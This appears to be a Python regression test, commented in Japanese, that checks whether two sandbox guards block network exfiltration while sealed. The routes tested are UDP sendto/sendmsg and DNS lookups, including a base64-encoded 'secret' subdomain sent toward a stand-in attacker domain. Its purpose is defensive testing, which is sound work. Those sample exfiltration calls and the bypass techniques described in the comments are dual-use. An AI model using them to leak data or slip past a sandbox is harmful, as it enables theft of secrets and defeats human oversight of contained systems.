import sys, os, socket
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import report_pass, report_fail, ROOT

NAME = "guard_network_exfiltration - 封鎖中にUDPのsendto()が正しく遮断されるかを確認する。"

# [新設 2026-10 §CA] 実際に発見した具体例: `maquina_gatekeeper.py`の
# `ultimate_audit_hook`("深層保護"、`sys.addaudithook`ベースの唯一の
# ランタイム防御層)は、ネットワーク通信を遮断する目的で"socket.connect"
# をforbidden集合に含めていた。しかしUDPの`socket.sendto()`は事前の
# `connect()`を一切必要とせずにデータを送信できるため、"socket.connect"
# というaudit eventを一度も発火させない。実機で確認済み:
# `set_sanctuary_sealed(True)`(深層保護が有効な状態)でも、
# `socket.sendto()`によるデータ送信が例外無しで素通りすることを確認
# した――封鎖中に外部へデータを持ち出す(exfiltration)経路が、
# "socket.connect"だけを遮断する実装では塞がれていなかった。
#
# [一般化の方針] §BW(`import os.path`による ast ベースのブロックリスト
# 回避)と同じ構造の欠陥――禁止したい意図(外部への通信・データ送信)は
# 同じなのに、別のAPIを使うだけで素通りしてしまう――だが、本件は
# AST静的解析ではなく`sys.addaudithook`ベースのランタイム監査フックが
# 対象であるため、`angels/check_equivalent_syntax_bypass.py`の対象には
# 含まれていなかった。本天使は、個々のイベント名の列挙を解析するのでは
# なく、実際に`ultimate_audit_hook`を登録し、封鎖状態で既知のネットワーク
# 送信手段(UDPの`socket.sendto()`)を実際に発火させて、正しく遮断される
# ことを継続的に検証する回帰連戦である。
#
# [正直な注記: 本検査の限界] (1) 本天使が検証するのは「UDPの
# socket.sendto()による接続不要の送信」という既知の具体的な経路のみで
# あり、将来Pythonが新たに追加する別のネットワークAPI(現時点では未知)
# には自動的には及ばない。(2) TCP経由の`send`/`sendall`はPythonの
# audit event仕様上そもそも専用のイベントを持たず、必ず事前の`connect`
# (= forbidden集合で既に遮断されている)を要するため、本天使の検査対象
# には含めていない(実機で確認済みの、検査不要と判断した境界)。
# (3) 本天使が検証する深層保護は、本リポジトリ全体のゼロトラスト
# アーキテクチャの一層(defense in depth)に過ぎず、唯一の防衛線では
# ない――Docker等によるOSレベルのネットワーク隔離(`--network none`)が
# 一次防衛線であることは、本ファイルより前の`cassiels_veil`関連の
# GRIMOIRE記述(§L等)が既に明記している前提と同じである。
#
# [新設 2026-11 §CT] `connect`を一切経由しない接続不要の送信経路として、
# UDPの`sendto`/`sendmsg`(§CA/§CM)とは別に、`socket.getaddrinfo()`による
# DNS名前解決そのものが、機密データをサブドメインラベルに符号化して
# 外部(攻撃者が管理する権威DNSサーバー)へ送出できる「DNS exfiltration」
# 経路になっていることを発見した。本ファイルの`forbidden`集合に
# "socket.getaddrinfo"を追加した修正の、継続的な再検証を本天使に追加
# する。独立した別の防御層である`sefer/__init__.py`の
# `_michael_absolute_defense`も、同じ理由で"socket.getaddrinfo"を
# `ALWAYS_PASSTHROUGH_AUDIT_EVENTS`から除外し、専用のallowed_hosts検査
# を新設する同種の修正を別途行った(GRIMOIRE.md §CT参照)。
#
# [新設 2026-11 §CU] §CTの直後、「DNS名前解決APIはgetaddrinfoだけか」を
# 実機で棚卸ししたところ、`socket.gethostbyname()`/`gethostbyname_ex()`
# ("socket.gethostbyname")・`gethostbyaddr()`("socket.gethostbyaddr")・
# `getnameinfo()`("socket.getnameinfo")も同じDNS exfiltration経路に
# なり得るが、本ファイルの`forbidden`集合に一度も含まれていなかった
# ことを発見した。独立した別の防御層`sefer/__init__.py`の
# `_michael_absolute_defense`は、引数からホスト名/アドレスを抽出する
# 汎用ロジックを既に備えていたため、これらは§CTより前から自動的に
# 保護されていた(本件はmaquina_gatekeeper側のみの欠陥)。

sys.path.insert(0, str(ROOT))


def _check_udp_sendto_is_blocked_while_sealed() -> tuple:
    """封鎖中にUDPのsendto()が正しく遮断されるかを確認する。
    戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    mg.set_sanctuary_sealed(True)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendto(b"leak-data", ("93.184.216.34", 12345))
            return False, "封鎖中にsocket.sendto()によるデータ送信が遮断されなかった"
        except mg.LossOfAtaraxia:
            return True, "OK"
    finally:
        mg.set_sanctuary_sealed(False)
        s.close()


def _check_udp_sendto_is_allowed_when_unsealed() -> tuple:
    """[誤検知防止] 封鎖していない通常時は、socket.sendto()が誤って
    遮断されないかを確認する。戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    if mg.is_sanctuary_sealed():
        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendto(b"hello", ("127.0.0.1", 1))
        except OSError:
            # [正直な注記] ネットワーク到達性やサンドボックス環境の制約に
            # よるOSError(例: ポートの到達不能)は、本検査が確認したい
            # 「深層保護による誤遮断の有無」とは無関係なため、安全に
            # 無視する(mg.LossOfAtaraxiaのみを本当の検知対象とする)。
            pass
        except mg.LossOfAtaraxia:
            return False, "封鎖していないのにsocket.sendto()が誤って遮断された"
        return True, "OK"
    finally:
        s.close()


def _check_udp_sendmsg_is_blocked_while_sealed() -> tuple:
    """[新設 §CM] 封鎖中にUDPのsendmsg()が正しく遮断されるかを確認する。
    sendto()と全く同じ「接続不要でデータを送信できる」経路だが、別の
    audit event("socket.sendmsg")を発火するため、forbidden集合への
    追加が別途必要だった(§CAのsendtoの修正では対象外のままだった)。
    戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    mg.set_sanctuary_sealed(True)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendmsg([b"leak-data"], [], 0, ("93.184.216.34", 12345))
            return False, "封鎖中にsocket.sendmsg()によるデータ送信が遮断されなかった"
        except mg.LossOfAtaraxia:
            return True, "OK"
    finally:
        mg.set_sanctuary_sealed(False)
        s.close()


def _check_udp_sendmsg_is_allowed_when_unsealed() -> tuple:
    """[新設 §CM・誤検知防止] 封鎖していない通常時は、socket.sendmsg()が
    誤って遮断されないかを確認する。戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    if mg.is_sanctuary_sealed():
        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        try:
            s.sendmsg([b"hello"], [], 0, ("127.0.0.1", 1))
        except OSError:
            # [正直な注記] sendto版と同じ理由(ネットワーク到達性の制約)
            # により、OSErrorは本検査の対象外として安全に無視する。
            pass
        except mg.LossOfAtaraxia:
            return False, "封鎖していないのにsocket.sendmsg()が誤って遮断された"
        return True, "OK"
    finally:
        s.close()


def _check_getaddrinfo_is_blocked_while_sealed() -> tuple:
    """[新設 §CT] 封鎖中にsocket.getaddrinfo()によるDNS名前解決(DNS
    exfiltration経路)が正しく遮断されるかを確認する。戻り値:
    (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    mg.set_sanctuary_sealed(True)
    try:
        try:
            socket.getaddrinfo("leak-via-dns-exfil.example.invalid", 80)
            return False, "封鎖中にsocket.getaddrinfo()によるDNS名前解決が遮断されなかった"
        except mg.LossOfAtaraxia:
            return True, "OK"
        except OSError as e:
            # [正直な注記] 本検査が使う".invalid"(RFC 2606の予約TLD)は、
            # 実際のDNSサーバーが存在するかどうかに関わらず、そもそも
            # 絶対に解決できないよう予約されている。したがって、本フック
            # が正しく遮断していれば実際のOS解決処理に到達する前に
            # `LossOfAtaraxia`が発生するはずで、ここに到達するのは
            # 「遮断されず実際のOS解決処理まで進んでしまった」ことの証拠
            # である(=封鎖が機能していない)。これを安全側に倒して失敗
            # として報告する(OSErrorを遮断成功と誤判定しない)。
            return False, f"封鎖中にsocket.getaddrinfo()が遮断されず、実際のOS解決処理まで進んでしまった(OSError: {e})"
    finally:
        mg.set_sanctuary_sealed(False)


def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
    """[新設 §CT・誤検知防止] 封鎖していない通常時は、
    socket.getaddrinfo()が誤って遮断されないかを確認する。戻り値:
    (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    if mg.is_sanctuary_sealed():
        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
    try:
        try:
            socket.getaddrinfo("127.0.0.1", 80)
        except OSError:
            # [正直な注記] ネットワーク・DNS到達性の制約によるOSErrorは、
            # 本検査が確認したい「深層保護による誤遮断の有無」とは無関係
            # なため、安全に無視する(mg.LossOfAtaraxiaのみを本当の
            # 検知対象とする)。
            pass
        except mg.LossOfAtaraxia:
            return False, "封鎖していないのにsocket.getaddrinfo()が誤って遮断された"
        return True, "OK"
    except Exception as e:
        return False, f"予期しない例外: {type(e).__name__}: {e}"


def _check_sefer_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
    """[新設 §CT] `maquina_gatekeeper.py`とは独立した別の防御層である
    `sefer.Sanctum`(allowed_hosts方式)自身も、同じDNS exfiltration
    経路を正しく遮断することを確認する。許可ホストに含まれていない
    ホスト名(機密データを符号化したサブドメインを模したもの)での
    socket.getaddrinfo()が、`sefer.LossOfAtaraxia`として遮断される
    ことを直接確認する。戻り値: (success: bool, detail: str)"""
    import sefer

    "warmup".encode("idna")
    secret_payload = "c2VjcmV0LWRhdGEtMTIzNDU"
    hostname = f"{secret_payload}.attacker-exfil-example.com"
    try:
        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
            try:
                socket.getaddrinfo(hostname, 80)
                return False, "sefer.Sanctum起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
            except sefer.LossOfAtaraxia:
                return True, "OK"
            except OSError as e:
                # [正直な注記] 上のmaquina_gatekeeper版と同じ理由により、
                # ここに到達すること自体が「遮断されず実際のOS解決処理
                # まで進んでしまった」ことの証拠であり、安全側に倒して
                # 失敗として報告する。
                return False, f"sefer.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
    finally:
        pass


def _check_sefer_sanctum_allows_approved_host_getaddrinfo() -> tuple:
    """[新設 §CT・誤検知防止] `sefer.Sanctum`が、allowed_hostsに含まれる
    ホスト名でのgetaddrinfo()、およびバインド用のNone(AI_PASSIVE)解決
    を誤って遮断しないことを確認する。戻り値: (success: bool, detail: str)"""
    import sefer

    "warmup".encode("idna")
    try:
        with sefer.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
            try:
                socket.getaddrinfo("127.0.0.1", 80)
            except sefer.LossOfAtaraxia as e:
                return False, f"許可ホストへの正当なgetaddrinfo()が誤って遮断された: {e}"
            try:
                socket.getaddrinfo(None, 8080, 0, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)
            except sefer.LossOfAtaraxia as e:
                return False, f"バインド用のgetaddrinfo(None, ...)が誤って遮断された: {e}"
        return True, "OK"
    except Exception as e:
        return False, f"予期しない例外: {type(e).__name__}: {e}"


def _check_legacy_dns_lookups_are_blocked_while_sealed() -> tuple:
    """[新設 §CU] 封鎖中にgethostbyname/gethostbyname_ex/gethostbyaddr/
    getnameinfoによるDNS関連の名前解決・逆引きが正しく遮断されるかを
    確認する。戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    mg.set_sanctuary_sealed(True)
    try:
        calls = [
            ("socket.gethostbyname", lambda: socket.gethostbyname("leak-via-dns-exfil.example.invalid")),
            ("socket.gethostbyname_ex", lambda: socket.gethostbyname_ex("leak-via-dns-exfil.example.invalid")),
            ("socket.gethostbyaddr", lambda: socket.gethostbyaddr("93.184.216.34")),
            ("socket.getnameinfo", lambda: socket.getnameinfo(("93.184.216.34", 80), 0)),
        ]
        for label, call in calls:
            try:
                call()
                return False, f"封鎖中に{label}が遮断されなかった"
            except mg.LossOfAtaraxia:
                continue
            except OSError as e:
                # [正直な注記] getaddrinfo版(§CT)と同じ理由により、ここに
                # 到達すること自体が「遮断されず実際のOS解決処理まで
                # 進んでしまった」ことの証拠であり、安全側に倒して失敗
                # として報告する。
                return False, f"{label}が遮断されず、実際のOS解決処理まで進んでしまった(OSError: {e})"
        return True, "OK"
    finally:
        mg.set_sanctuary_sealed(False)


def _check_legacy_dns_lookups_are_allowed_when_unsealed() -> tuple:
    """[新設 §CU・誤検知防止] 封鎖していない通常時は、これらの関数が
    誤って遮断されないかを確認する。戻り値: (success: bool, detail: str)"""
    import maquina_gatekeeper as mg

    mg._register_audit_hook_once()
    if mg.is_sanctuary_sealed():
        return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
    calls = [
        ("socket.gethostbyname", lambda: socket.gethostbyname("127.0.0.1")),
        ("socket.gethostbyaddr", lambda: socket.gethostbyaddr("127.0.0.1")),
        ("socket.getnameinfo", lambda: socket.getnameinfo(("127.0.0.1", 80), socket.NI_NUMERICHOST | socket.NI_NUMERICSERV)),
    ]
    for label, call in calls:
        try:
            call()
        except OSError:
            # [正直な注記] ネットワーク・DNS到達性の制約によるOSErrorは、
            # 本検査が確認したい「深層保護による誤遮断の有無」とは無関係
            # なため、安全に無視する。
            pass
        except mg.LossOfAtaraxia as e:
            return False, f"封鎖していないのに{label}が誤って遮断された: {e}"
    return True, "OK"


CHECKS = [
    ("maquina_gatekeeper.ultimate_audit_hook: UDP sendto遮断", _check_udp_sendto_is_blocked_while_sealed),
    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendto)", _check_udp_sendto_is_allowed_when_unsealed),
    ("maquina_gatekeeper.ultimate_audit_hook: UDP sendmsg遮断(§CM)", _check_udp_sendmsg_is_blocked_while_sealed),
    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendmsg, §CM)", _check_udp_sendmsg_is_allowed_when_unsealed),
    ("maquina_gatekeeper.ultimate_audit_hook: DNS名前解決遮断(§CT)", _check_getaddrinfo_is_blocked_while_sealed),
    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(getaddrinfo, §CT)", _check_getaddrinfo_is_allowed_when_unsealed),
    ("sefer.Sanctum: DNS名前解決の許可ホスト検査(§CT)", _check_sefer_sanctum_blocks_unapproved_getaddrinfo),
    ("sefer.Sanctum: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_sefer_sanctum_allows_approved_host_getaddrinfo),
    ("maquina_gatekeeper.ultimate_audit_hook: 旧API DNS関連遮断(gethostbyname等, §CU)", _check_legacy_dns_lookups_are_blocked_while_sealed),
    ("maquina_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(旧API DNS関連, §CU)", _check_legacy_dns_lookups_are_allowed_when_unsealed),
]


def run_battery():
    """`ultimate_audit_hook`に対し、既知のネットワーク送信迂回経路を
    実際に与えて、正しく処理されるかを確認する。
    戻り値: [(name, detail), ...] (失敗したものだけ)"""
    failures = []
    for name, check_fn in CHECKS:
        try:
            success, detail = check_fn()
        except BaseException as e:
            # [脆弱性修正 2026-10 §CO追記] sefer.LossOfAtaraxia等、
            # BaseExceptionを直接継承する例外は`except Exception`では
            # 捕捉されず、検査関数が想定外にそれを発生させた場合、
            # 本来「安全側に倒して失敗として報告する」はずの設計が
            # 機能せず、run_battery自体が未処理の例外で丸ごと落ちて
            # しまう(angels/guard_socket_send_bypass.pyの新設時に
            # 実機で発見)。KeyboardInterrupt/SystemExit等も含め
            # 広く捕捉するが、本関数の唯一の責務は「1件の検査関数の
            # 呼び出し結果を安全に報告する」ことであり、ここで拾った
            # 例外は再送出せずfailuresに記録するだけなので、プロセス
            # 全体の正常なシャットダウン経路を妨げない。
            failures.append((name, f"検査関数自体が例外を発生: {type(e).__name__}: {e}"))
            continue
        if not success:
            failures.append((name, detail))
    return failures


def main():
    failures = run_battery()
    if failures:
        detail = "; ".join(f"{n}({d})" for n, d in failures)
        report_fail(
            NAME,
            f"深層保護のネットワーク送信遮断に、少なくとも1つの既知の"
            f"迂回経路が再発しています(§CAの回帰): {detail}",
            evidence={"failures": failures},
        )
        return

    report_pass(
        NAME,
        "封鎖中のUDP sendto()・sendmsg()による接続不要のデータ送信、"
        "getaddrinfo()によるDNS名前解決(§CT、maquina_gatekeeper・"
        "sefer.Sanctumの両方の独立した防御層)、およびgethostbyname/"
        "gethostbyaddr/getnameinfo等の旧API経由のDNS関連呼び出し(§CU)が"
        "いずれも正しく遮断され、かつ非封鎖時・許可ホスト・バインド用"
        "解決はいずれも誤って遮断されないことを確認しました。",
    )


if __name__ == "__main__":
    main()
